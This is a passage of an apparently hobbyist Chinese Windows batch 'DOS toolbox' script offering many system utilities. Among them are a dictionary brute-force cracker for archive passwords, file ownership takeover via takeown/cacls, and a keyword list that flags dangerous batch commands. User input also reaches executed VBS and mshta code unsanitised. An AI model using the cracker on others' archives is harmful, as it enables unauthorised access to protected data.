echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 36
:shijinzhicw
echo 不是十进制整数!
ping/n 2 0.0>nul
goto 10z
:2z
cls
set srejz=
set/p srejz=请输入二进制整数:
for /f "delims=01" %%a in ('echo %srejz%') do goto srejzcw
set/a nnn=1
set/a num=0
set nn=
set "n=%srejz%"
set "n=!n:0= 0!"
set "n=!n:1= 1!"
for %%a in (!n!) do set "nn=%%a !nn!"
for %%a in (!nn!) do set /a num+=%%a*nnn,nnn*=2
set ejzjg=%num%
set ejzjgbak=%ejzjg%
set ejzjgbak2=%ejzjgbak%
set ejzjgbak3=%ejzjgbak2%
:ejzjg
set/a e=ejzjg%%2
set/a ejzjg=ejzjg/2
set erjinzhi=%e%%erjinzhi%
if %ejzjg% neq 0 goto ejzjg
:ejzjg1
set/a b=%ejzjgbak%%%8
set/a ejzjgbak=%ejzjgbak%/8
set bajinzhi=%b%%bajinzhi%
if %ejzjgbak% neq 0 goto ejzjg1
:ejzjg2
set/a s=%ejzjgbak3%%%16
if "%s%"=="10" set s=A
if "%s%"=="11" set s=B
if "%s%"=="12" set s=C
if "%s%"=="13" set s=D
if "%s%"=="14" set s=E
if "%s%"=="15" set s=F
set/a ejzjgbak3=%ejzjgbak3%/16
set shilioujinzhi=%s%%shilioujinzhi%
if %ejzjgbak3% neq 0 goto ejzjg2
cls
echo 十进制:%ejzjgbak2%
echo 二进制:%erjinzhi%
echo 八进制:%bajinzhi%
echo 十六进制:%shilioujinzhi%
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 36
:srejzcw
echo 不是二进制整数!
ping/n 2 0.0>nul
goto 2z
:vbsjsq
title vbs计算器%system%
set vbsbds=
set vbsjieguo=
cls
echo e=返回菜单
set/p vbsbds=请输入表达式:
:for /f "delims=eE" %%a in ('echo %vbsbds%') do goto js
if /i "%vbsbds%"=="e" if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
:js
echo msgbox %vbsbds%,"65","VBS计算器">%systemdrive%\windows\temp.vbs
%systemdrive%\windows\temp.vbs
del/f/q %systemdrive%\windows\temp.vbs
goto vbsjsq
:guanyu
title 关于DOS工具箱%system%%gxflag%
if %daxiao%==%versize% set daxiao1=%daxiao%字节
if %daxiao% neq %versize% set daxiao1=%daxiao%字节  (文件大小异常,可能已被修改)
set dosjssj=%time%
call :sjc "%dosqssj%" "%dosjssj%"
cls
echo 关于DOS工具箱
echo _______________________________________________________________________________
echo 版本: 1.9.1 (%ver%.%versize%)
echo 操作系统: %system:~3% %bit%位
echo 版权所有 2012-2024 Administrator 保留所有权利
echo _______________________________________________________________________________
echo 本次已运行:%sjc:~0,2%时%sjc:~2,2%分%sjc:~4,2%.%sjc:~6,2%秒
echo DOS工具箱所在路径:%weizhi%
echo 文件大小:%daxiao1%
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
:37
title 文本浏览%system%
cls
echo _______________________________________________________________________________
echo 要显示多个文件,就用空格隔开路径,显示文件以后:
echo F=显示下个文件,Q=退出,等号显示行数,空格显示下一页,回车显示下一行
echo _______________________________________________________________________________
set wenben=
set/p wenben=拖动需要显示的文件到此窗口:
if "%wenben:~0,1%%wenben:~-1%" neq """" for /f "delims=" %%a in ('"echo %wenben%"') do (set %wenben%="%%~a")
echo _______________________________________________________________________________
more/e/p "%wenben%"
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:38
title 显示计算机与用户的设置%system%
cls
echo _______________________________________________________________________________
gpresult/z
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:39
title NTFS压缩%system%
cls
echo 此功能只能用于NTFS分区,要压缩或者解压多个文件,就用空格隔开路径.
echo _______________________________________________________________________________
echo [1]NTFS压缩
echo [2]NTFS解压
echo [3]NTFS压缩文件夹
echo [4]NTFS解压文件夹
echo [0]返回菜单
echo _______________________________________________________________________________
choice /c 12340 /n /m 请输入你的选择:
if "%errorlevel%" equ "1" goto yasuo
if "%errorlevel%" equ "2" goto jieya
if "%errorlevel%" equ "3" goto yasuowjj
if "%errorlevel%" equ "4" goto jieyawjj
if "%errorlevel%" equ "5" goto memuv2
goto 39
set ntfsys=
set/p ntfsys=请输入你的选择:
set ntfsys="%ntfsys:|=%"
if !ntfsys!=="1" goto yasuo
if !ntfsys!=="2" goto jieya
if !ntfsys!=="3" goto yasuowjj
if !ntfsys!=="4" goto jieyawjj
if !ntfsys!=="0" goto memuv2
echo 请输入正确的选择！
ping/n 2 0.0>nul
goto 39
:jieya
title NTFS解压%system%
cls
set jieya=
set/p jieya=拖动需要解压的文件到此窗口:
if "%jieya:~0,1%%jieya:~-1%" neq """" for /f "delims=" %%a in ('"echo %jieya%"') do (set %jieya%="%%~a")
echo _______________________________________________________________________________
compact /u /a /i /f "%jieya%"
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto 39
:yasuo
title NTFS压缩%system%
cls
set yasuo=
set/p yasuo=拖动需要压缩的文件到此窗口:
if "%yasuo:~0,1%%yasuo:~-1%" neq """" for /f "delims=" %%a in ('"echo %yasuo%"') do (set %yasuo%="%%~a")
echo _______________________________________________________________________________
compact /c /a /i /f "%yasuo%"
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto 39
:jieyawjj
title NTFS解压文件夹%system%
cls
set jieya=
set/p jieya=拖动需要解压的文件夹到此窗口:
if "%jieya:~0,1%" neq """" for /f "delims=" %%a in ('"echo %jieya%"') do (set %jieya%="%%~a")
echo _______________________________________________________________________________
compact /u /a /i /f /s:"%jieya%"
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto 39
:yasuowjj
title NTFS压缩文件夹%system%
cls
set jieya=
set/p jieya=拖动需要压缩的文件夹到此窗口:
if "%jieya:~0,1%%jieya:~-1%" neq """" for /f "delims=" %%a in ('"echo %jieya%"') do (set %jieya%="%%~a")
echo _______________________________________________________________________________
compact /c /a /i /f /s:"%jieya%"
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto 39
:40
title 获取文件所有权限%system%
cls
echo 此功能只能用于NTFS分区
echo _______________________________________________________________________________
set ntfswjqx=
set/p ntfswjqx=拖动需要获取所有权限的文件或者文件夹到此窗口:
if "%ntfswjqx:~0,1%%ntfsjqx:~-1%" neq """" for /f "delims=" %%a in ('"echo %ntfswjqx%"') do (set %ntfswjqx%="%%~a")
echo _______________________________________________________________________________
attrib -s -h -r "%ntfswjqx%" 2>nul
takeown/f "%ntfswjqx%" 2>nul
takeown/f "%ntfswjqx%" 2>nul
attrib -s -h -r "%ntfswjqx%" 2>nul
echo y|cacls "%ntfswjqx%" /t /c /g %username%:f 2>nul
attrib -s -h -r "%ntfswjqx%" 2>nul
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:41
title 显示开机启动项%system%
cls
echo _______________________________________________________________________________
if /i "%system:~18,1%"=="x" dir/a/s/b "%systemdrive%\Documents and Settings\%username%\「开始」菜单\程序\启动"
if /i "%system:~18,1%"=="x" dir/a/s/b "%systemdrive%\Documents and Settings\all users\「开始」菜单\程序\启动"
if /i "%system:~18,1%" neq "x" dir/a/s/b "%systemdrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
if /i "%system:~18,1%" neq "x" dir/a/s/b "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\WindowsNT\CurrentVersion\Windows\load 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\Userinit 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\Setup 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\Setup 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v taskman 2>nul"') do if not "%%a"=="" echo %%a&echo;
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run 2>nul"') do if not "%%a"=="" echo %%a&echo;
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:kcd
start mshta "javascript:new ActiveXObject('WMPlayer.OCX').cdromCollection.Item(0).Eject();window.close();"
if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
:gcd
start mshta "javascript:with (new ActiveXObject('WMPlayer.OCX').cdromCollection.Item(0)){Eject();Eject();}window.close();"
if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
:42
title 语音阅读器%system%
cls
echo 请输入要阅读的内容:
echo _______________________________________________________________________________
set ydnr=
set/p ydnr=
start mshta vbscript:createobject("sapi.spvoice").speak("%ydnr%")(window.close)
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:43
title 批处理文件风险分析%system%
set dx=0
cls
set batfx=
set/p batfx=拖动要分析的文件到此窗口:
if "%batfx:~0,1%%batfx:~-1%" neq """" for /f "delims=" %%a in ('"echo %batfx%"') do (set %batfx%="%%~a")
echo _______________________________________________________________________________
find /n /i "del" "%batfx%"&&set/a dx=%dx%+1
find /n /i "rd" "%batfx%"&&set/a dx=%dx%+1
find /n /i "arp" "%batfx%"&&set/a dx=%dx%+1
find /n /i "assoc" "%batfx%"&&set/a dx=%dx%+1
find /n /i "attrib" "%batfx%"&&set/a dx=%dx%+1
find /n /i "cacls" "%batfx%"&&set/a dx=%dx%+1
find /n /i "format" "%batfx%"&&set/a dx=%dx%+1
find /n /i "ftype" "%batfx%"&&set/a dx=%dx%+1
find /n /i "taskkill" "%batfx%"&&set/a dx=%dx%+1
find /n /i "taskl" "%batfx%"&&set/a dx=%dx%+1
find /n /i "reg" "%batfx%"&&set/a dx=%dx%+1
find /n /i "ren" "%batfx%"&&set/a dx=%dx%+1
find /n /i "regsvr32" "%batfx%"&&set/a dx=%dx%+1
find /n /i "rd" "%batfx%"&&set/a dx=%dx%+1
find /n /i "schtask" "%batfx%"&&set/a dx=%dx%+1
find /n /i "shutdown" "%batfx%"&&set/a dx=%dx%+1
echo _______________________________________________________________________________
echo 批处理文件: %batfx%
echo 危险等级: %dx%
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:44
title 文件搜索%system%
cls
set sswjm=
set/p sswjm=输入你要搜索的文件名(默认在%systemdrive%\中搜索):
echo _______________________________________________________________________________
dir/a/s %sswjm%
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:45
title 修复已损坏的文件%system%
cls
set xfwj=
set/p xfwj=拖动要修复的文件到此窗口:
if "%xfwj:~0,1%%xfwj:~-1%" neq """" for /f "delims=" %%a in ('"echo %xwfj%"') do (set %xfwj%="%%~a")
echo _______________________________________________________________________________
recover %xfwj%
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:46
title 暴力破解压缩包密码%system%
cls
set rarazlj=
set yswjlj=
set pjzd=
set ppjm=
for /f "delims=" %%a in ('"reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /v path|find "path""') do (set rarazlj=%%a)
if "%system:~8,2%"=="XP" (set rarpd=%rarazlj:~16%\Rar.exe&set rarpd7z=%rarazlj:~16%\winrar.exe) else (set rarpd=%rarazlj:~22%\Rar.exe&set rarpd7z=%rarazlj:~22%\winrar.exe)
cls
if exist "%rarpd%" (goto rarjs) else (echo 没有安装WinRAR.按任意键返回菜单&pause>nul&goto memuv2)
:rarjs
cls
set/p yswjlj=拖动要破解的压缩包到此窗口(e=返回菜单):
if "%yswjlj:~0,1%%yswjlj:~-1%" neq """" for /f "delims=" %%a in ('"echo %yswjlj%"') do (set %yswjlj%="%%~a")
for /f "delims=" %%a in ("%yswjlj%") do if %%~xa==.7z goto rarwjok1
for /f "delims=" %%a in ("%yswjlj%") do if %%~xa==.rar goto rarwjok
for /f "delims=" %%a in ("%yswjlj%") do if %%~xa==.zip goto rarwjok1
if /i "%yswjlj%"=="e" goto memuv2
echo 无效的文件格式！&ping/n 2 0.0>nul
goto 46
:rarwjok
set/p pjzd=拖动字典文件到此窗口(e=返回菜单):
if "%pjzd:~0,1%%pjzd:~-1%" neq """" for /f "delims=" %%a in ('"echo %pjzd%"') do (set %pjzd%="%%~a")
for /f "delims=" %%a in ("%pjzd%") do if %%~xa==.txt goto kspj
if /i "%pjzd%"=="e" goto memuv2
echo 不是txt文件！&ping/n 2 0.0>nul
goto 46
:rarwjok1
set/p pjzd=拖动字典文件到此窗口(e=返回菜单):
if "%pjzd:~0,1%%pjzd:~-1%" neq """" for /f "delims=" %%a in ('"echo %pjzd%"') do (set %pjzd%="%%~a")
for /f "delims=" %%a in ("%pjzd%") do if %%~xa==.txt goto kspj1
if /i "%pjzd%"=="e" goto memuv2
echo 不是txt文件！&ping/n 2 0.0>nul
goto 46
:kspj
echo _______________________________________________________________________________
rd/s/q %systemdrive%windows\temp\DOS工具箱临时解压路径>nul 2>nul
md %systemdrive%windows\temp\DOS工具箱临时解压路径
for /f "delims=" %%a in ('type "%pjzd%"') do (
cls
echo 正在破解的压缩包:%yswjlj%
echo;
echo 正在使用的字典文件:%pjzd%
echo;
set pjmm=%%a
echo 正在尝试密码:%%a
"%rarpd%" x -y -inul -p%%a "%yswjlj%" "%systemdrive%windows\temp\DOS工具箱临时解压路径"
dir/s/b %systemdrive%windows\temp\DOS工具箱临时解压路径|find  /v "找不到文件"&&goto pjcg)
echo _______________________________________________________________________________
echo 破解失败！
echo;
echo 字典里没有正确的密码.
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:pjcg
echo _______________________________________________________________________________
echo 破解成功！
echo;
echo 压缩包%yswjlj%
echo 解压密码是:%pjmm%
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:kspj1
echo _______________________________________________________________________________
rd/s/q %systemdrive%windows\temp\DOS工具箱临时解压路径>nul 2>nul
md %systemdrive%windows\temp\DOS工具箱临时解压路径
for /f "delims=" %%a in ('type "%pjzd%"') do (
cls
echo 正在破解的压缩包:%yswjlj%
echo;
echo 正在使用的字典文件:%pjzd%
echo;
set pjmm=%%a
echo 正在尝试密码:%%a
"%rarpd7z%" x -y -inul -p%%a "%yswjlj%" "%systemdrive%windows\temp\DOS工具箱临时解压路径"
dir/s/b %systemdrive%windows\temp\DOS工具箱临时解压路径|find  /v "找不到文件"&&goto pjcg1)
echo _______________________________________________________________________________
echo 破解失败！
echo;
echo 字典里没有正确的密码.
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:pjcg1
echo _______________________________________________________________________________
echo 破解成功！
echo;
echo 压缩包%yswjlj%
echo 解压密码是:%pjmm%
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:47
title Wifi热点%system%
cls
echo _______________________________________________________________________________
echo [1]开启Wifi热点
echo [2]关闭Wifi热点
echo [3]查看网络配置
echo [0]返回菜单
echo _______________________________________________________________________________
choice /c 1230 /n /m 请输入你的选择:
if "%errorlevel%" equ "1" goto kqwifi
if "%errorlevel%" equ "2" goto gbwifi
if "%errorlevel%" equ "3" goto wlpz
if "%errorlevel%" equ "4" goto memuv2
goto 47
set wifixz=
set/p wifixz=请输入你的选择:
set wifixz="%wifixz:|=%"
if !wifixz!=="1" goto kqwifi
if !wifixz!=="2" goto gbwifi
if !wifixz!=="3" goto wlpz
if !wifixz!=="0" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 47
:kqwifi
title 开启Wifi热点%system%
cls
set wifissid=
set wifimiam=
set/p wifissid=请输入Wifi名称(SSID):
set/p wifimima=请输入Wifi密码(密码位数:8到63位):
cls
net start sharedaccess 2>nul
netsh wlan stop hostednetwork
netsh wlan set hostednetwork mode=allow ssid="%wifissid%" key=%wifimima%
netsh wlan start hostednetwork
echo _______________________________________________________________________________
echo 如果无法连接请手动获取IP地址(如果开启系统防火墙也会无法连接成功)
echo Wifi名称(SSID):%wifissid%
echo Wifi密码:%wifimima%
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 47
:gbwifi
title 关闭Wifi热点%system%
cls
netsh wlan stop hostednetwork
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 47
:wlpz
title 查看网络配置%system%
cls
ipconfig /all
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 47
:48
title 反编译chm文件%system%
cls
set chmlj=
echo 拖动要反编译的chm文件到此窗口
set/p chmlj=反编译后的文件保存在桌面(e=返回):
set chmlj="%chmlj:|=%"
if /i !chmlj!=="e" goto memuv2
if "%chmlj:~0,1%%chmlj:~-1%" neq """" for /f "delims=" %%a in ('"echo %chmlj%"') do (set %chmlj%="%%~a")
for /f "delims=" %%a in ("%chmlj%") do (
if /i not %%~xa==.chm goto nochm
set chmcglj=
set chmcglj=%%~na
copy/y "%chmlj%" %systemdrive%\windows\temp\tmp.chm
hh -decompile %systemdrive%\windows\temp\chm %systemdrive%\windows\temp\tmp.chm
md "%zmlj%%%~na"
xcopy/c/e/y %systemdrive%\windows\temp\chm "%zmlj%%%~na"
rd/s/q %systemdrive%\windows\temp\chm
del/f/q %systemdrive%\windows\temp\tmp.chm)
:chmcg
cls
echo 反编译成功！
echo 以保存到%zmlj%%chmcglj%
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:nochm
echo _______________________________________________________________________________
echo 不是chm文件！
ping/n 2 0.0>nul
goto 48
:xz
title 卸载DOS工具箱%system%
cls
set xzgjx=
set/p xzgjx=是否卸载工具箱(Y/N)?
set xzgjx="%xzgjx:|=%"
if /i !xzgjx!=="y" goto xzgjx
if /i !xzgjx!=="n" if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
echo 请输入正确的选择
ping/n 2 0.0>nul
goto xz
:xzgjx
reg delete HKEY_CURRENT_USER\System\DOS工具箱 /f>nul 2>nul
rd/s/q %systemdrive%\dos工具箱临时目录>nul 2>nul
cls
echo 卸载成功
ping/n 2 0.0>nul
if "!errorlevel!" equ "0" (del/f/q %0)
exit 0
:49
title 关闭无响应进程%system%
cls
taskkill /f /fi "status eq not responding"
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
:50
title 文件比较器%system%
cls
echo 拖动要比较的文件到此窗口(比较过程中连按 "Ctrl+C" 2次可结束比较)
echo _______________________________________________________________________________
set/p wj1=第一个要比较的文件:
set/p wj2=第二个要比较的文件:
echo _______________________________________________________________________________
fc/b %wj1% %wj2%
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:51
title 将文字写入剪切板%system%
set nz=
cls
set/p  nz=请输入要写入到剪切板的文字内容:
mshta vbscript:clipboardData.SetData("text","%nz%")(window.close)
if %errorlevel%==0 (set nz=0) else (set nz=1)
echo _______________________________________________________________________________
if %nz%==0 (echo 写入成功) else (echo 写入失败)
echo 按任意键返回菜单&pause>nul
goto memuv2
:52
cls
start services.msc
goto memuv2
:53
cls
title 已知年月日计算星期%system%
set jsxq=00000000
set/p jsxq=请输入年月日(例如20150605):
for /f "delims=0123456789" %%a in ('echo %jsxq%') do goto wstg3
for /l %%a in (0,1,1000) do if "!jsxq:~%%a,1!"=="" set b=%%a&&goto wstg2
:wstg2
if %b%==8 goto jsxq
:wstg3
echo 请输入正确的格式!
ping/n 2 0.0>nul
goto 53
:jsxq
set y=%jsxq:~0,4%
if %y% lss 10 set/a y=0x%y%
set m=%jsxq:~4,2%
if %m% lss 10 set/a m=0x%m%
if %m%==1 set m=13&set/a y=%y%-1
if %m%==2 set m=14&set/a y=%y%-1
set d=%jsxq:~6,2%
if %d% lss 10 set/a d=0x%d%
set/a d=%d%+1
set/a w=%d%+2*%m%+3*(%m%+1)/5+%y%+%y%/4-%y%/100+%y%/400
set/a w=%w%%%7
set/a rn1=%y%%%4
set/a rn2=%y%%%100
set/a rn3=%y%%%400
set rn=平年
if %rn1%==0 if %rn2% neq 0 set rn=闰年
if %rn2%==0 if %rn3%==0 set rn=闰年
if %w%==1 set w=一
if %w%==2 set w=二
if %w%==3 set w=三
if %w%==4 set w=四
if %w%==5 set w=五
if %w%==6 set w=六
if %w%==0 set w=天
echo;
echo %rn% %jsxq:~0,4%年%jsxq:~4,2%月%jsxq:~6,2%日是星期%w%
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:54
cls
title 查询系统激活状态%system%
echo 操作系统: %system:~3% %bit%位
if "!system:~8,2!"=="XP" echo Windows XP系统无法使用此功能查询
echo _______________________________________________________________________________
echo [1]显示许可信息
echo [2]显示详细的许可信息
echo [3]显示当前许可状态的截止日期
echo [0]返回菜单
echo _______________________________________________________________________________
choice /c 1230 /n /m 请输入你的选择:
if "%errorlevel%" equ "1" start slmgr.vbs -dli&goto 54
if "%errorlevel%" equ "2" start slmgr.vbs -dlv&goto 54
if "%errorlevel%" equ "3" start slmgr.vbs -xpr&goto 54
if "%errorlevel%" equ "4" goto memuv2
goto 54
set cxxz=
set/p cxxz=请输入你的选择:
set cxxz="%cxxz:|=%"
if !cxxz!=="1" start slmgr.vbs -dli&goto 54
if !cxxz!=="2" start slmgr.vbs -dlv&goto 54
if !cxxz!=="3" start slmgr.vbs -xpr&goto 54
if !cxxz!=="0" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 54
:55
cls
title 创建指定文件的快捷方式到桌面%system%
set kjfs=
set/p kjfs=请拖动目标文件到此窗口:
if "!kjfs!"=="" goto 55(1)
if "%kjfs:~0,1%%kjfs:~-1%" neq """" for /f "delims=" %%a in ('"echo %kjfs%"') do (set %kjfs%="%%~a")
for /f "delims=" %%a in ("%kjfs%") do set kjfsmc=%%~na
mshta VBScript:Execute("Set a=CreateObject(""WScript.Shell""):Set b=a.CreateShortcut(a.SpecialFolders(""Desktop"") & ""\%kjfsmc%.lnk""):b.TargetPath=""%kjfs%"":b.WorkingDirectory=""%~dp0"":b.Save:close")
:55(1)
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:56
cls
start msconfig.exe
goto memuv2
:57
cls
title 字数统计%system%
set zstj=
set/p zstj=请输入文字:
call :zfccd "%zstj%"
echo 总计%zfcgs%个字(包含标点符号)
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:58
cls
title 创建符号链接%system%
set swjj=
set cwjj=
set/p swjj=输入要链接的文件夹路径:
set/p cwjj=输入链接文件夹的输出路径:
if "%swjj:~0,1%%swjj:~-1%" neq """" for /f "delims=" %%a in ('"echo %swjj%"') do (set %swjj%="%%~a")
if "%cwjj:~0,1%%cwjj:~-1%" neq """" for /f "delims=" %%a in ('"echo %cwjj%"') do (set %cwjj%="%%~a")
mklink /d %cwjj% %swjj%
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:59
title 打开管理控制台%system%
cls
start mmc
goto memuv2
:60
cls
title 解除Streams文件锁定%system%
set jcwjsd=
set/p jcwjsd=拖动目标文件到此窗口:
if "%jcwjsd:~0,1%%jcwjsd:~-1%" neq """" for /f "delims=" %%a in ('"echo %jcwjsd%"') do (set %jcwjsd%="%%~a")
echo>"%jcwjsd%:Zone.Identifier"
echo 操作完成
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:61
title 创建、删除或列出卷装入点%system%
cls
echo _______________________________________________________________________________
echo [1]列出卷装入点
echo [2]删除不在系统中的、卷的装入点目录和注册表设置
echo [3]列出指定目录的已装入的卷名称
echo [4]创建盘符(创建卷装入点)
echo [5]删除盘符(删除卷装入点)
echo [0]返回菜单
echo _______________________________________________________________________________
choice /c 123450 /n /m 请输入你的选择:
if "%errorlevel%" equ "1" goto 61(1)
if "%errorlevel%" equ "2" goto 61(2)
if "%errorlevel%" equ "3" goto 61(3)
if "%errorlevel%" equ "4" goto 61(4)
if "%errorlevel%" equ "5" goto 61(5)
if "%errorlevel%" equ "6" goto memuv2
goto 61
set gzxz=
set/p gzxz=请输入你的选择:
set gzxz="%gzxz:|=%"
if !gzxz!=="1" goto 61(1)
if !gzxz!=="2" goto 61(2)
if !gzxz!=="3" goto 61(3)
if !gzxz!=="4" goto 61(4)
if !gzxz!=="5" goto 61(5)
if !gzxz!=="0" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 61
:61(1)
title 列出卷装入点%system%
cls
for /f "skip=22" %%a in ('"mountvol"') do echo %%a
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 61
:61(2)
title 删除不在系统中的,卷的装入点目录和注册表设置%system%
cls
mountvol /r
echo 操作完成
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 61
:61(3)
title 列出指定目录的已装入的卷名称%system%
cls
fsutil fsinfo drives
echo _______________________________________________________________________________
set xszz=
set/p xszz=请输入需要显示的盘符:
cls
echo %xszz%:\&mountvol %xszz%: /l
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 61
:61(4)
title 创建盘符(创建卷装入点)%system%
cls
set xx1=0
for /f "delims=" %%a in ('"mountvol|find "\\?\Volume""') do (set/a xx1=!xx1!+1
set b!xx1!=%%a
echo [!xx1!]%%a)
echo [0]返回上级菜单
echo _______________________________________________________________________________
set cjpf=
set/p cjpf=选择装入点:
if "%cjpf%"=="" goto 61(4)
if !cjpf!==0 goto 61
set xzpf=
set/p xzpf=输入盘符:
mountvol %xzpf%: !b%cjpf%!
echo 操作完成
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 61
:61(5)
title 删除盘符(删除卷装入点)%system%
cls
fsutil fsinfo drives
echo _______________________________________________________________________________
set scpf=
set/p scpf=请输入需要删除的盘符:
mountvol %scpf%: /d
echo 操作完成
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 61
:62
title 注册表搜索%system%
cls
set zcbss=
set/p zcbss=输入你要搜索的名称:
set zcbss="%zcbss:|=%"
echo _______________________________________________________________________________
echo (1/5)在HKEY_CLASSES_ROOT中搜索...
reg query hkcr /f !zcbss! /s
echo _______________________________________________________________________________
echo (2/5)在HKEY_CURRENT_USER中搜索...
reg query hkcu /f !zcbss! /s
echo _______________________________________________________________________________
echo (3/5)在HKEY_LOCAL_MACHINE中搜索...
reg query hklm /f !zcbss! /s
echo _______________________________________________________________________________
echo (4/5)在HKEY_USERS中搜索...
reg query hku /f !zcbss! /s
echo _______________________________________________________________________________
echo (5/5)在HKEY_CURRENT_CONFIG中搜索...
reg query hkcc /f !zcbss! /s
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:63
title Base编解码%system%
cls
if exist %systemroot%\system32\certutil.exe (dir/ad %systemroot%\system32\certutil.exe>nul 2>nul||goto 63-0)
echo 没有找到certutil.exe
echo 不能继续Base编解码
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:63-0
echo _______________________________________________________________________________
echo [1]Base解码
echo [2]Base编码
echo [0]返回菜单
echo _______________________________________________________________________________
choice /c 120 /n /m 请输入你的选择:
